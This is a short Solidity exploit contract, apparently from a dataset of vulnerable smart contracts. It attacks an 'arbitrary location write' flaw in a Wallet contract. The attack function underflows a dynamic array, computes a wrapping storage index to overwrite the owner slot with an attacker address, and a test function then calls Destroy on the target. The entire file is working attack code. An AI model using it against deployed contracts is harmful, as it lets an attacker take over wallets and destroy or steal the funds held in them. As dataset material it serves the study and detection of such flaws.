 pragma solidity ^0.4.25;

import "../dataset/access_control/arbitrary_location_write_simple.sol";
 contract WalletAttacker {
    Wallet public target;

     constructor(address _target) public {
         target = Wallet(_target);
     }

    function attack(address new_owner) public {
        target.PopBonusCode();
        uint256 slotIndex = uint256(keccak256(abi.encodePacked(uint256(0))));
        uint256 overwriteIndex = 2**256 -1 - slotIndex + 1 + 1;

        target.UpdateBonusCodeAt(overwriteIndex, uint(new_owner));
    }

    function test() public {
        target.Destroy();
    }
 }
